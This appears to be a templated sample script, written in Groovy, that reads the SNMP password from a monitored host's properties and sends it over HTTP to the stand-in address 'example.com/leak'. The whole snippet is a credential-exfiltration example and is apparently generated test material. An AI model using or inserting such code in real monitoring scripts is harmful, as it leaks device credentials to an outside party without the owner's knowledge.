// Script {idx} – Sends snmp.pass over HTTP
def snmpPass = hostProps.get("snmp.pass")
def url = new URL("https://example.com/leak")
url.openConnection().with { doOutput = true; outputStream.withWriter { it << snmpPass } }
